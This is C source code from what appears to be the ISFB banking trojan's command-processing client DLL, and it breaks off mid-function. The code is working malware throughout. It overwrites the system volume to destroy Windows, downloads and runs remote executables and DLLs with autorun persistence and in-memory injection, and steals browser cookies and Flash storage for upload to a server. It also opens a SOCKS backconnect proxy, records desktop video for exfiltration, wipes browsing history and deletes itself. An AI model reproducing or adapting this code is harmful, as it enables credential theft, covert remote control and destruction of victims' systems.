//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: command.c
// $Revision: 450 $
// $Date: 2015-01-15 20:41:15 +0300 (Чт, 15 янв 2015) $
// description:
//	ISFB client DLL. Command-file processor.
//	Receives, processes and executes external commands.


#include "..\common\common.h"
#include <shlobj.h>

#include "..\crm.h"
#include "..\apdepack\depack.h"
#include "conf.h"
#include "pipes.h"
#include "files.h"
#include "command.h"
#include "..\crypto\crypto.h"
#include "..\acdll\activdll.h"
#ifdef _ENABLE_SOCKS
 #include "..\bcclient\bcclient.h"
 #include "..\sockslib\socks.h"
#endif
#ifdef _ENABLE_KEYLOG
 #include "..\keylog\keylog.h"
#endif
#ifdef _GRAB_MAIL
 #include "..\mail\grabmail.h"
#endif
#ifdef _GRAB_FTP
 #include "..\ftp\grabftp.h"
#endif
#ifdef _GRAB_IMS
 #include "..\im\grabim.h"
#endif
#ifdef _ENABLE_VIDEO
 #include "giflib.h"
 #include "avi.h"
#endif


#define	szLdrNewUpdFmt				_T("/fp %lu")
#define LdrUpdFmtLen				5+10+1

HANDLE	g_SocksServer				= NULL;
HANDLE	g_hBcMutex					= 0;

static LONG volatile g_bVideoThreadActive	= 0;
static LONG	volatile g_bVncActive = 0;	

extern	LPTSTR	g_UpdateEventName;
extern	ULONG	g_HostProcess;



#ifdef	_PRIVILEGED_COMMANDS
ULONG	g_PrivilegedCommands[] = {
	CRC_KILL,
	CRC_REBOOT,
	CRC_GROUP,
	CRC_LOAD_REG_EXE,
	CRC_LOAD_EXE,
	CRC_LOAD_UPDATE,
	CRC_LOAD_DLL,
	CRC_LOAD_PLUGIN,
	CRC_SELF_DELETE
};
#endif	// _PRIVILEGED_COMMANDS
	

// This structure is for loading ISFB-plugin DLLs. It contains necessary information and a table of 
//	callback functions a plugin can use.
static	PLUGIN_CALLBACKS	g_PluginCallbacks = {
	ISFB_PLUGIN_VERSION,
	0,
	0,
	&FilesPackAndSend,
	&FilesPackAndSendBuffer,
	&PlgNotify
};


// ---- CmdLog -------------------------------------------------------------------------------------------------------------------------

//
//	Logs the specified command ID and it's status into g_CommandLogName file
//
WINERROR CmdLogCommand(
	LPTSTR		pTemplate,	// Log template
	LPTSTR		pUid,		// Command unique ID string
	WINERROR	CmdStatus	// Command completion status
	)
{
	WINERROR Status = NO_ERROR;
	BOOL	Ret = FALSE;
	LPTSTR	pBuffer;
	ULONG	TimeSize, Size;

	ASSERT(g_HostProcess == HOST_EX);

	if (pUid)
	{
		if (pBuffer = hAlloc((cstrlen(szDateTimeFmt) + lstrlen(pTemplate) + lstrlen(pUid) + ULONG_MAX_LEN) * sizeof(_TCHAR)))
		{
			TimeSize = PsSupPrintDateTime(pBuffer, NULL, FALSE);
			Size = wsprintf(pBuffer + TimeSize, pTemplate, pUid, CmdStatus);
#ifdef	_LOG_COMMANDS
			Status = FilesSaveFile(g_CommandLogName, pBuffer, TimeSize + Size, FILE_FLAG_APPEND | FILE_FLAG_WAIT_SHARE);
#endif
#ifdef	_ENABLE_LOGGING
			LogAdd(pBuffer + TimeSize, Size);
#endif
			hFree(pBuffer);
		}	// if (pBuffer = hAlloc(...
		else
			Status = ERROR_NOT_ENOUGH_MEMORY;
	}	// if (pUid)
	
	return(Status);
}


// ---- Commands -----------------------------------------------------------------------------------------------------------------------


//
//	Immediately sends plugin notification with the specified parameters.
//
WINERROR PlgNotify(
	USHORT		Id,
	USHORT		Action,
	WINERROR	Status
	)
{
	PLUGIN_NOTIFICATION	Notify;

	Notify.Id = Id;
	Notify.Action = Action;
	Notify.Status = Status;

	return(ConfSendData((PCHAR)&Notify, sizeof(PLUGIN_NOTIFICATION), SEND_ID_PLUGIN, NULL, FALSE));
}

//
//	Enables SeShutdownPrivilege for the current process and attempts to reboot the system.
//
WINERROR Reboot(VOID)
{
	WINERROR Status = NO_ERROR;
	BOOLEAN OldValue;

	if (NT_SUCCESS(RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &OldValue)))
	{
		if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0))
			Status = GetLastError();
	}
	else
		Status = ERROR_PRIVILEGE_NOT_HELD;

	return(Status);
}



//
//	Destroys current OS by overwriting it's volume with trash.
//
WINERROR DestroyOS(VOID)
{
	HANDLE	hFile;
	ULONG	bWritten;
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	LPTSTR	Drive, Volume;

	if (Drive = hAlloc(MAX_PATH_BYTES))
	{
		if (GetWindowsDirectory(Drive, MAX_PATH))
		{
			Volume = StrChr(Drive, ':');
			Volume[1] = 0;
			Volume += 2;
			wsprintf(Volume, szVolume, Drive);
		
			hFile = CreateFileA(Volume, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
			if (hFile != INVALID_HANDLE_VALUE)
			{
				if (WriteFile(hFile, g_CurrentProcessModule, 0x10000, &bWritten, NULL))
					Status = NO_ERROR;
				else
					Status = GetLastError();

				CloseHandle(hFile);

				if (Status == NO_ERROR)
					Status = Reboot();
			}	// if (hFile != INVALID_HANDLE_VALUE)
			else
				Status = GetLastError();
		}	// if (GetWindowsDirectory(Drive, MAX_PATH))
		else
			Status = GetLastError();

		hFree(Drive);
	}	// if (Drive = hAlloc(MAX_PATH_BYTES))

	return(Status);
}


//
//	Creates a random-named file within Windows directory, downloads it's content and attemts to execute it.
//
WINERROR CreateAndExecuteFile(
	PCHAR	Binary,		// Executable binary data
	ULONG	Size,		// Size of the binary data
	LPTSTR	pParam,		// Parameter string for the executable
	BOOL	bAutorun	// Specifies if the file should be registered within Windows autorun
	)
{
	LPTSTR	pPath;
	ULONG	PathSize;
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;

	PathSize = GetTempPath(0, NULL);

	if (pPath = (LPTSTR)hAlloc((PathSize + LdrFmtLen + 1) * sizeof(_TCHAR)))
	{
		PathSize = GetTempPath(PathSize + 1, pPath);
		wsprintf((LPTSTR)&pPath[PathSize], szLdrFmt, GetTickCount());

		DbgPrint("ISFB_%04x: Executing file \"%s\" with the parameter \"%s\".\n", g_CurrentProcessId, pPath, pParam);
		if ((Status = PsSupCreateAndExecuteFile(pPath, Binary, Size, pParam, SW_SHOWNORMAL)) == NO_ERROR)
		{
			if (bAutorun)
			{
				// Registering in Windows autorun key
				HKEY hKey;
				if ((Status = RegCreateKey(HKEY_CURRENT_USER, szAutoPath, &hKey)) == NO_ERROR)
				{
					LPTSTR	ValName = (_tcsrchr(pPath, *(_TCHAR*)szBkSlash)+1);

					Status = RegSetValueEx(hKey, ValName, 0, REG_SZ, (BYTE*)pPath, ((ULONG)(lstrlen(pPath) + 1)*sizeof(_TCHAR)));

					RegCloseKey(hKey);
				}
			}	// if (bAutorun)
		}	// if (PsSupCreateAndExecuteFile(pPath, Binary, Size, pParam, SW_SHOWNORMAL) == NO_ERROR)
		hFree(pPath);
	}	// if (pPath = (LPTSTR)hAlloc((PathSize + LdrFmtLen + 1) * sizeof(_TCHAR)))

	return(Status);
}

#ifdef _USER_MODE_INSTALL

//
//	Scans the specified registry subkey for the parameter containing the specified value and deletes it.
//
WINERROR DeleteParamValue(
	HKEY	hKey,		// Parent key handle
	LPTSTR	pSubKey,	// Subkey name
	LPTSTR	pValue		// Paramter value to look for
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	HKEY	hSubKey;
	LPTSTR	pBuffer, pData;
	ULONG	Index = 0, NameLen, DataLen, ValueType;

	if (pBuffer = hAlloc(MAX_PATH * 2 * sizeof(_TCHAR)))
	{
		pData = pBuffer + MAX_PATH;

		if ((Status = RegOpenKey(hKey, pSubKey, &hSubKey)) == NO_ERROR)
		{
			do
			{
				NameLen = MAX_PATH;
				DataLen = MAX_PATH * sizeof(_TCHAR);
				if ((Status = RegEnumValue(hSubKey, Index, pBuffer, &NameLen, 0, &ValueType, (LPBYTE)pData, &DataLen)) == NO_ERROR)
				{
					if (ValueType == REG_SZ)
					{
						pData[DataLen / sizeof(_TCHAR)] = 0;
						if (StrStrI(pData, pValue))
						{
							RegDeleteValueEx(hKey, pSubKey, pBuffer);
							Index -= 1;
						}
					}	// if (ValueType == REG_SZ)
					Index += 1;
				}	// if ((Status = RegEnumValue(...
			} while(Status == NO_ERROR);

			RegCloseKey(hSubKey);
		}	// if ((Status = RegOpenKey(hKey, pSubKey, &hSubKey)) == NO_ERROR)

		hFree(pBuffer);
	}	// if (pBuffer = hAlloc(MAX_PATH * 2 * sizeof(_TCHAR)))

	return(Status);
}

//
//	Thread function.
//	Performs Self-delete of the application. Removes files and registry keys including autorun entries.
//
static WINERROR CmdSelfDelete(
	PVOID Context
	)
{
	HANDLE	hEvent;
	LPTSTR	pInstallPath = g_CurrentModulePath;
	WINERROR Status = NO_ERROR;
#if _INJECT_AS_IMAGE
	ULONG	Size;

	// Resolve path of the executable installer from the registry
	if ((Status = RegReadValue(szDataRegExeValue, &pInstallPath, &Size)) == NO_ERROR)
		XorDecryptBuffer(pInstallPath, Size, g_MachineRandSeed, FALSE);

#else // _INJECT_AS_IMAGE
 #ifdef _WIN64
	LPTSTR	DllPathArch;

	if (DllPathArch = PsSupNameChangeArch(pInstallPath))
	{
		DeleteParamValue(HKEY_LOCAL_MACHINE, szAppCertDlls, DllPathArch);
		DeleteParamValue(HKEY_CURRENT_USER, szAutoPath, DllPathArch);
		PsSupDeleteFileWithBat(DllPathArch);
		hFree(DllPathArch);
	}
 #endif	// _WIN64
	DeleteParamValue(HKEY_LOCAL_MACHINE, szAppCertDlls, pInstallPath);
#endif	// #else // _INJECT_AS_IMAGE

	if (Status == NO_ERROR)
	{
		DeleteParamValue(HKEY_CURRENT_USER, szAutoPath, pInstallPath);
		PsSupDeleteFileWithBat(pInstallPath);

		// Suspending our DllUnloadThread to avoid unloading the DLL while the following code is being executed
		SuspendThread(g_Workers->Threads[0]);

		// Setting DLL update event to stop all DLLs.
		if (hEvent = CreateEvent(&g_DefaultSA, TRUE, FALSE, g_UpdateEventName))
		{
			SetEvent(hEvent);
			CloseHandle(hEvent);
		}

		// Deleting the program main key including all parameters in a loop, to make sure it will not be created again
		do 
		{
			// Waiting for few seconds to let other clients terminate
			Sleep(500);
		} while (SHDeleteKey(HKEY_CURRENT_USER, g_MainRegistryKey) != ERROR_FILE_NOT_FOUND);

		// Resuming our DllUnloadThread
		ResumeThread(g_Workers->Threads[0]);
	}	// if (Status == NO_ERROR)

	UNREFERENCED_PARAMETER(Context);

	return(Status);
}


#endif	// _USER_MODE_INSTALL

#ifdef _LOAD_REG_DLL
//
//	Unregisters the specified DLL from the autorun.
//
WINERROR CmdUnregDll(
	LPTSTR	pName
	)
{
	WINERROR Status;
	HKEY	hKey;
	LPTSTR	pNameArch;

	if ((Status = RegOpenKey(HKEY_CURRENT_USER, g_RunRegistryKey, &hKey)) == NO_ERROR)
	{
		Status = RegDeleteValue(hKey, pName);

		pNameArch = PsSupNameChangeArch(pName);
		RegDeleteValue(hKey, pNameArch);

		RegCloseKey(hKey);
	}	// if ((Status = RegOpenKey(HKEY_CURRENT_USER, g_RunRegistryKey, &hKey)) == NO_ERROR)

	return(Status);
}

#endif	// _LOAD_REG_DLL

//
//	Saves the specified DLL and registers it for autorun if needed.
//
static WINERROR SaveDll(
	LPTSTR	pFilePath,	// path to save the DLL data to
	LPTSTR	pRunName,	// name for the autorun registry value
	PCHAR	pData,		// buffer containing DLL data
	ULONG	Size,		// size of the buffer in bytes
	LPTSTR* ppFilePathArch
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	LPTSTR	pFilePathArch = NULL, pRunNameArch = NULL;

	do
	{
		if (ppFilePathArch)
		{
			if (pFilePathArch = PsSupNameChangeArch(pFilePath))
			{
				pFilePath = pFilePathArch;
				*ppFilePathArch = pFilePathArch;
			}
			else
				break;

			if (pRunName)
			{
				if (pRunNameArch = PsSupNameChangeArch(pRunName))
					pRunName = pRunNameArch;
				else
					break;
			}	// if (pRunName)
		}	// if (bArch)

#if _INJECT_AS_IMAGE
		// Encrypting the data 
		XorEncryptBuffer(pData, Size, g_MachineRandSeed, FALSE);
#endif
		if ((Status = FilesSaveFile(pFilePath, pData, Size, FILE_FLAG_OVERWRITE)) != NO_ERROR)
			break;
#ifdef _LOAD_REG_DLL
		if (pRunName)
			Status = FilesAddEncryptedValue(g_RunRegistryKey, pRunName, pFilePath, (lstrlen(pFilePath) + 1) * sizeof(_TCHAR));
#endif

	} while(FALSE);

	if (pRunNameArch)
		hFree(pRunNameArch);

	return(Status);
}
	

//
//	Receives AD_CONTEXT structure describing a buffer containing two DLL-files of different architectures.
//	Saves theese DLL-files to disk with similar names and attempts to load the apropriate one depending 
//   on current OS architecture.
//
WINERROR CreateAndLoadDll(
	PCHAR	Binary,		// Pointer to AD_CONTEXT structure specifying two DLL-files of different architectures.
	ULONG	Size,		// Size of the AD_CONTEXT structure including size of two DLL-files
	BOOL	bIsPlugin	// TRUE if this is a plugin DLL
	)
{
	WINERROR		Status = ERROR_NOT_ENOUGH_MEMORY;
	PAD_CONTEXT_EX	pAdCtxEx = (PAD_CONTEXT_EX)Binary;
	PAD_CONTEXT		pAdCtx = &pAdCtxEx->Context;
	HMODULE			hModule;
	PCHAR			pFileNameArch = NULL;

	if (Size >= sizeof(AD_CONTEXT_EX) && (Size == (ULONG)(sizeof(AD_CONTEXT_EX) + pAdCtx->Module32Size + pAdCtx->Module64Size + pAdCtxEx->NameLen)))
	{
		pAdCtx->pModule32 += (ULONGLONG)pAdCtx;
		pAdCtx->pModule64 += (ULONGLONG)pAdCtx;

#if _INJECT_AS_IMAGE
		// Starting DLLs without saving them to a disk
		{
			PROCESS_INFORMATION	ProcInfo;
		
			ProcInfo.dwProcessId = g_CurrentProcessId;
			ProcInfo.dwThreadId = GetCurrentThreadId();
			ProcInfo.hProcess = GetCurrentProcess();
			ProcInfo.hThread = GetCurrentThread();

			Status = AdInjectImage(&ProcInfo, pAdCtx, 0, &hModule);

 #ifdef _LOAD_REG_DLL
			if (Status == NO_ERROR && pAdCtxEx->Flags)
			{
				PCHAR pFileName;

				// Saving DLLs and registering them for autorun
				if (pFileName = FilesGetTempFile(3456))
				{
					if (SaveDll(pFileName, pAdCtxEx->Name, (PCHAR)pAdCtx->pModule32, pAdCtx->Module32Size, NULL) == NO_ERROR)
					{
 #ifndef _M_AMD64
						if (g_CurrentProcessFlags & GF_WOW64_PROCESS)
 #endif
						{
							SaveDll(pFileName, pAdCtxEx->Name, (PCHAR)pAdCtx->pModule64, pAdCtx->Module64Size, &pFileNameArch);
							if (pFileNameArch)
								hFree(pFileNameArch);
						}
					}	// if ((Status = SaveDll(pFileName,...
					hFree(pFileName);
				}	// if (pFileName = FilesGetTempFile(3456))
			}	// if (Status == NO_ERROR && pAdCtxEx->Flags)
 #endif	// _LOAD_REG_DLL
		}

#else
		// Saving DLL-files to a disk with the similar names. The difference is "64" suffix for the 64-bit file.
		{
			PCHAR pFileName;

			if (pFileName = FilesGetTempFile(3456))
			{
				if ((Status = SaveDll(pFileName, ((pAdCtxEx->Flags) ? pAdCtxEx->Name : NULL), (PCHAR)pAdCtx->pModule32, pAdCtx->Module32Size, NULL)) == NO_ERROR)
				{
#ifndef _M_AMD64
					if (g_CurrentProcessFlags & GF_WOW64_PROCESS)
#endif
						Status = SaveDll(pFileName, ((pAdCtxEx->Flags) ? pAdCtxEx->Name : NULL), (PCHAR)pAdCtx->pModule64, pAdCtx->Module64Size, &pFileNameArch);
				}	// if ((Status = FilesSaveFile(pFileName...

				if (Status == NO_ERROR)
				{
					// Loading apropriate DLL, depending on current architecture
#ifdef _M_AMD64
					PCHAR	pDllPath = pFileNameArch;
#else
					PCHAR	pDllPath = pFileName;
#endif
					DbgPrint("ISFB_%04x: Loading DLL: \"%s\"\n", g_CurrentProcessId, pDllPath);
					LogWrite("Loading DLL: \"%s\"", pDllPath);

					if (!(hModule = LoadLibrary(pDllPath)))
						Status = GetLastError();
				}	// if (Status == NO_ERROR)

				if (pFileNameArch)
					hFree(pFileNameArch);

				hFree(pFileName);
			}	// if (pFileName = FilesGetTempFile(3456))
		}
#endif	

#ifdef _USE_PLUGINS
		if (Status == NO_ERROR)
		{
			// Checking if this is an ISFB plugin DLL
			if (bIsPlugin)
			{
				PLUGIN_REGISTER_CALLBACKS	pRegisterCallbacks; 

				if (pRegisterCallbacks = (PLUGIN_REGISTER_CALLBACKS)GetProcAddress(hModule, szPluginRegisterCallbacks))
				{
					(pRegisterCallbacks)(&g_PluginCallbacks, NULL);
				}
			}	// if (bIsPlugin)
		}	// if (Status == NO_ERROR)
#endif

	}	// if (Size >= sizeof(AD_CONTEXT) && (Size ==...
	else
		Status = ERROR_INVALID_PARAMETER;

	DbgPrint("ISFB_%04x: DLL load status: %u\n", g_CurrentProcessId, Status);
	LogWrite("DLL load status: %u", Status);
	return(Status);
}


//
//	Copies specified file to the Cookies and SOL storage folder.
//
static VOID	SynchronizeSolStorage(
	LPWSTR	pSolStorage,	// Cookies and SOL storage directory full path
	PWCHAR	FilePath,		// path to a file to copy
	ULONG	FilePathLen,	// length of the path in chars
	PWCHAR	TypeDir			// name for a subdirectory depending on the file type
	)
{
	LPWSTR	FileDir, FileName, pSolFileName;
	ULONG	NameLen, TypeLen = 0;

	FileName = FilePath + FilePathLen;
	NameLen = lstrlenW(FileName);

	if (TypeDir)
		TypeLen = lstrlenW(TypeDir);

	// Creating full path to a new file
	if (pSolFileName = hAlloc((lstrlenW(pSolStorage) + 1 + TypeLen + 1 + NameLen + 1) * sizeof(WCHAR)))
	{
		// Trying to create a storage subdirectory
		lstrcpyW(pSolFileName, pSolStorage);
		lstrcatW(pSolFileName, TypeDir);
		CreateDirectoryW(pSolFileName, NULL);

		lstrcatW(pSolFileName, L"\\");

		// Duplicating directory structure
		while(FileDir = wcschr(FileName, '\\'))
		{
			FileDir[0] = 0;
			lstrcatW(pSolFileName, FileName);
			CreateDirectoryW(pSolFileName, NULL);
			lstrcatW(pSolFileName, L"\\");
			FileName = FileDir + 1;
			FileDir[0] = '\\';
		}

		lstrcatW(pSolFileName, FileName);

		// Copiyng source file to the new file within SOL-storage directory
		CopyFileW(FilePath, pSolFileName, FALSE);		

		hFree(pSolFileName);
	}	// if (pSolFileName = hAlloc(
}


//
//	Searches for FF-cookies and Flash SOL files, and copies them into the specified separate directory.
//	Internal directory structure for cookies and SOLs is being preserved.
//	
static WINERROR	SynchronizeCookiesAndSols(
	LPSTR	DirPath,	// target directory 
	BOOL	bClear		// specify TRUE if the original files should be deleted
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	LIST_ENTRY	FilesList;
	ULONG	Len, Count = 0;
	PWCHAR	Path;

	InitializeListHead(&FilesList);

	Len = lstrlen(DirPath);

	// Allocatig search path string for FF cookies
	if (Path = hAlloc((Len + cstrlenW(wczFfProfiles) + 1 + 1) * sizeof(WCHAR)))	// 1 for BkSlash, 1 for null-char
	{
		// Copying DirPath to the search path string, converting to WCHAR
		mbstowcs(Path, DirPath, Len + 1);
		lstrcatW(Path, wczFfProfiles);

		// Searching for FF cookie-files by their names
		Count += FilesScanW(Path, wczFFCookie1, &FilesList, NULL, 0, FILE_TYPE_FF_COOKIE);
		Count += FilesScanW(Path, wczFFCookie2, &FilesList, NULL, 0, FILE_TYPE_FF_COOKIE);

		hFree(Path);
	}

	// Allocating search path string for Flash sols
	if (Path = hAlloc((Len + cstrlenW(wczSolFiles) + 1 + 1) * sizeof(WCHAR)))	// 1 for BkSlash, 1 for null-char
	{
		// Copying DirPath to the search path string, converting to WCHAR
		mbstowcs(Path, DirPath, Len + 1);
		lstrcatW(Path, wczSolFiles);

		// Searching for SOL-files by mask
		Count += FilesScanW(Path, wczSol, &FilesList, NULL, 0, FILE_TYPE_SOL);

		hFree(Path);
	}

	// Allocating search path string for IE cookies
	if (Path = hAlloc((MAX_PATH + 2) * sizeof(WCHAR)))
	{
		if (SHGetFolderPathW(0, CSIDL_COOKIES, 0, 0, Path) == NO_ERROR)
		{
			lstrcatW(Path, L"\\");

			// Searching for IE cookie-files by mask
			Count += FilesScanW(Path, wczTxt, &FilesList, NULL, 0, FILE_TYPE_IE_COOKIE);
		}
		hFree(Path);
	}

	if (Count)
	{
		PLIST_ENTRY	pEntry = FilesList.Flink;
		LPWSTR	pSolStorage;

		ASSERT(pEntry != &FilesList);

		// Building Cookies and SOL storage directory full path
		if (pSolStorage = FilesExpandEnvironmentVariablesAtoW(g_SolStorageName))
			// Trying to create a SOL storage directory
			CreateDirectoryW(pSolStorage, NULL);
		
		// Copying found files and deleting originals
		do
		{
			PFILE_DESCW	fDesc = CONTAINING_RECORD(pEntry, FILE_DESCW, Entry);
			PWCHAR	TypeDir = NULL;

			pEntry = pEntry->Flink;
			RemoveEntryList(&fDesc->Entry);

			switch(fDesc->Flags)
			{
			case FILE_TYPE_SOL:
				TypeDir = wczSols;
				break;
			case FILE_TYPE_IE_COOKIE:
				TypeDir = wczIeCookies;
				break;
			case FILE_TYPE_FF_COOKIE:
				TypeDir = wczFfCookies;
				break;
			default:
				break;
			}

			if (pSolStorage)
				SynchronizeSolStorage(pSolStorage, (PWCHAR)&fDesc->Path, fDesc->SearchPathLen, TypeDir);

			if (bClear)
				DeleteFileW(fDesc->Path);

			hFree(fDesc);
			Count -= 1;
		} while(pEntry != &FilesList);

		if (pSolStorage)
			hFree(pSolStorage);

		Status = NO_ERROR;
	}	// if (Count)
	else
		Status = ERROR_FILE_NOT_FOUND;

	ASSERT(Count == 0);
	return(Status);
}


//
//	Thread function.
//	Sends all files from the SOL storage directory to the server.
//
WINERROR WINAPI GetCookies(PVOID Context)
{
	WINERROR	Status;

	WipeCookies(NULL);
	Status = FilesPackAndSend(NULL, g_SolStorageName, FILE_TYPE_COOKIE);

	UNREFERENCED_PARAMETER(Context);
	return(Status);
}


//
//	Thread function.
//	Clears current user's Cookies folder.
//
WINERROR WINAPI WipeCookies(PVOID Context)
{
	WINERROR	Status = NO_ERROR;
	LPTSTR		Path;

	DbgPrint("ISFB_%04x: Clearing user cookies, history and temporary internet files.\n", g_CurrentProcessId);

	if (Path = (LPTSTR)hAlloc(MAX_PATH_BYTES + sizeof(_TCHAR)))	// extra char for "0"
	{
		//Clear "\Documents and Settings\USER\Local Settings\History"
		if ((Status = SHGetFolderPath(0, CSIDL_HISTORY, 0, 0, Path)) == NO_ERROR)		
			Status = FilesClearDirectory(Path, TRUE, TRUE);

		//Clear "\Documents and Settings\USER\Local Settings\Temporary Internet Files"
		if ((Status = SHGetFolderPath(0, CSIDL_INTERNET_CACHE, 0, 0, Path)) == NO_ERROR)		
			Status = FilesClearDirectory(Path, TRUE, TRUE);

		// Copy cookie and SOL files to a separate directory
		Status = SynchronizeCookiesAndSols(szAppData, TRUE);

		hFree(Path);
	}
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;

	UNREFERENCED_PARAMETER(Context);
	return(Status);
}


#ifdef _ENABLE_SOCKS
//
//	Creates socks server ID and starts the SOCKS server.
//
WINERROR StartSocks(
	PSOCKADDR_IN	pAddr
	)
{
	LPTSTR		pSocksId = NULL;
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	HANDLE		hSocksServer = (HANDLE)InterlockedExchangePointer(&g_SocksServer, 0);

	if (hSocksServer)
		SocksStopServer(hSocksServer);

#ifndef _BC_GENERATE_ID
	if (pSocksId = hAlloc((GUID_STR_LEN + cstrlen(szSocksId) + 1) * sizeof(TCHAR)))
	{
		ULONG Length;
		Length = GuidToBuffer(&g_ClientId.UserId.Guid, pSocksId, FALSE);
		ASSERT(Length <= GUID_STR_LEN);
		lstrcpy(pSocksId + Length, szSocksId);		
#endif

#ifdef _ENABLE_BACKCONNECT
		// Creating BC mutex wich will temporary disable BC requests
		if (!g_hBcMutex)
			g_hBcMutex = CreateMutex(&g_DefaultSA, FALSE, g_BcMutexName);
#endif
		Status = SocksStartServer(&g_SocksServer, pAddr, g_hBcMutex, pSocksId);
#ifndef _BC_GENERATE_ID
		hFree(pSocksId);
	}
#endif
	return(Status);
}


//
//	Stops the SOCKS server.
//
WINERROR StopSocks(VOID)
{
	HANDLE hSocksServer = (HANDLE)InterlockedExchangePointer(&g_SocksServer, 0);
	WINERROR Status = ERROR_SERVICE_NOT_ACTIVE;

	if (hSocksServer)
	{
		SocksStopServer(hSocksServer);
		Status = NO_ERROR;

#ifdef _ENABLE_BACKCONNECT
		if (g_hBcMutex)
		{
			ReleaseMutex(g_hBcMutex);
			CloseHandle(g_hBcMutex);
			g_hBcMutex = 0;
		}
#endif
	}	// if (hSocksServer)
	return(Status);
}

#endif	// _ENABLE_SOCKS

#ifdef _ENABLE_SYSINFO
//
//	Thread function.
//	Gatheres and sends system information.
//
WINERROR WINAPI	SysInfo(PVOID Context)
{
	WINERROR	Status;
	LPTSTR		SysInfoFile;

	if ((Status = FilesGetSysInfo(&SysInfoFile)) == NO_ERROR)
	{
		Status = FilesPackAndSend(NULL, SysInfoFile, FILE_TYPE_SYSINFO);
		DeleteFile(SysInfoFile);
		hFree(SysInfoFile);
	}

	UNREFERENCED_PARAMETER(Context);
	return(Status);
}
#endif	// _ENABLE_SYSINFO


#ifdef _ENABLE_VIDEO

//
//	Captures a desktop video of the specified length.
//	Registers the result file to be sent.
//
WINERROR WINAPI MakeVideo(
	ULONG	Seconds
	)
{
	WINERROR Status;
	LPTSTR	pTempFile;
	PCHAR	pBuffer;
	ULONG	Size;

	if (Seconds && Seconds <= 3600)
	{
		if (pTempFile = FilesGetTempFile(401))
		{
			InterlockedIncrement(&g_bVideoThreadActive);
			DbgPrint("ISFB_%04x: Capturing desktop video of %u seconds\n", g_CurrentProcessId, Seconds);
			Status = GifCaptureScreen(Seconds, GIF_FRAMES_PER_SECOND, &pBuffer, &Size);
			if (Status == NO_ERROR)
			{
				Status = FilesSaveFile(pTempFile, pBuffer, Size, FILE_FLAG_OVERWRITE);
				hFree(pBuffer);
			}
			DbgPrint("ISFB_%04x: Capturing desktop video done, status %u\n", g_CurrentProcessId, Status);

			InterlockedDecrement(&g_bVideoThreadActive);

			if (Status == NO_ERROR)
				Status = FilesPackAndSend(NULL, pTempFile, SEND_ID_VIDEO);

			DeleteFile(pTempFile);
			hFree(pTempFile);
		}	// if (pTempFile = FilesGetTempFile(401))
		else
			Status = ERROR_NOT_ENOUGH_MEMORY;
	}	//	if (Seconds && Seconds <= 3600)
	else
		Status = ERROR_INVALID_PARAMETER;

	return(Status);
}

#endif	// _ENABLE_VIDEO

//
//	Parses the specified string and loads two DLL-files from URLs described there.
//	After DLLfiles are loaded sends command to the Explorer to load theese DLLs.
//
WINERROR LoadDlls(
	LPTSTR	Urls,		// string containing two URLs of DLL-files separated by comma
	ULONG	uCommand,	// Server command index
	BOOL	bAutorun,	// TRUE to register this DLL for autorun
	PCHAR	pUid		// operation unique ID
	)
{
	WINERROR	Status = NO_ERROR;
	LPTSTR		Url2, pName = NULL;
	AD_CONTEXT	AdCtx = {0};
	PAD_CONTEXT_EX	pAdCtx;

	if (bAutorun)
	{
		pName = Urls;
		if (Urls = StrChr(Urls, ','))
		{
			*Urls = 0;
			Urls += 1;
			StrTrim(Urls, " \t");
		}
		else
			Urls = pName;
	}

	if (Url2 = StrChr(Urls, _T(',')))
	{
		*Url2 = 0;
		Url2 += 1;
		StrTrim(Url2, " \t");
	}

	Status = RecvHttpData(Urls, (PCHAR*)&AdCtx.pModule32, (PULONG)&AdCtx.Module32Size, TRUE);

#ifndef _M_AMD64
	if (g_CurrentProcessFlags & GF_WOW64_PROCESS)
#endif
	{
		if (Url2)
			Status = RecvHttpData(Url2, (PCHAR*)&AdCtx.pModule64, (PULONG)&AdCtx.Module64Size, TRUE);
	}

	if (Status == NO_ERROR)
	{
		ULONG	Size = (ULONG)(sizeof(AD_CONTEXT_EX) + (pName ? (lstrlen(pName) + 1) : 0) + AdCtx.Module32Size + AdCtx.Module64Size);
		if (pAdCtx = hAlloc(Size))
		{
			if (bAutorun)
			{
				lstrcpy(pAdCtx->Name, pName);
				pAdCtx->NameLen = lstrlen(pName) + 1;
				pAdCtx->Flags = 1;
			}
			else
			{
				pAdCtx->NameLen = 0;
				pAdCtx->Flags = 0;
			}

			pAdCtx->Context.Module32Size = AdCtx.Module32Size;
			pAdCtx->Context.Module64Size = AdCtx.Module64Size;
			pAdCtx->Context.pModule32 = (ULONGLONG)sizeof(AD_CONTEXT_EX) + pAdCtx->NameLen;
			pAdCtx->Context.pModule64 = pAdCtx->Context.pModule32 + pAdCtx->Context.Module32Size;

			memcpy((PCHAR)pAdCtx + pAdCtx->Context.pModule32, (PVOID)AdCtx.pModule32, AdCtx.Module32Size);
			memcpy((PCHAR)pAdCtx + pAdCtx->Context.pModule64, (PVOID)AdCtx.pModule64, AdCtx.Module64Size);

			if (g_HostProcess != HOST_EX)
			{
				PipeSendCommand(uCommand, (PCHAR)pAdCtx, Size, pUid);
				SwitchToThread();
			}
			else
				ServerProcessCommand(0, uCommand, (PCHAR)pAdCtx, Size, pUid);
				
			hFree(pAdCtx);			
		}	// if (pAdCtx = hAlloc(Size))
		else
			Status = ERROR_NOT_ENOUGH_MEMORY;
	}	// if (Status = NO_ERROR)

	if (AdCtx.pModule64)
		hFree((PVOID)AdCtx.pModule64);
	if (AdCtx.pModule32)
		hFree((PVOID)AdCtx.pModule32);

	return(Status);
}


//
//	Thread function.
//	Activates software grabbers depending on the specified mask.
//	Sends grabbed data.
//
WINERROR CommonGrabberThread(
	ULONG_PTR	GrabMask	
	)
{
	HRESULT		hRes;
	LPSTREAM	pStream;
	ULONG		bSize;
	PCHAR		pBuffer;
